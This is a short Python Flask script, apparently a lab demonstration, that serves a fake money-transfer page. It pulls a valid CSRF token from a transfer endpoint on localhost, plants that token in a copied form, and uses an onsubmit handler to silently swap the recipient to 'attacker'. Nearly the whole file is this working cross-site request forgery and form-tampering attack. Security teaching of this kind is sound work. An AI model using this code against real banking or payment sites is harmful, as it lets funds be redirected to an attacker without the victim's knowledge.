from flask import Flask, render_template, request, make_response, redirect
import requests
from lxml import html


app = Flask(__name__)

content = """
<html><body>
<h1>Transfer Money<img src=https://www.flaticon.com/svg/static/icons/svg/3716/3716811.svg>
<form method='post' action='http://localhost:5000/transfer' onsubmit=document.getElementById('to').value="attacker"><p>
Amount:<input name='amount'><p>
To:<input name='to' id='to'>
<input type='hidden' name='csrf_token' value='{}'/>
<input type=submit>
</form>
</body></html>
"""

def get_token():
    page=requests.get("http://localhost:5000/transfer")
    tree = html.fromstring(page.content)
    token=dict(tree.forms[0].inputs.items())["csrf_token"].value
    return content.format(token)

@app.route('/transfer', methods=['GET'])
def csrf():
    return get_token()
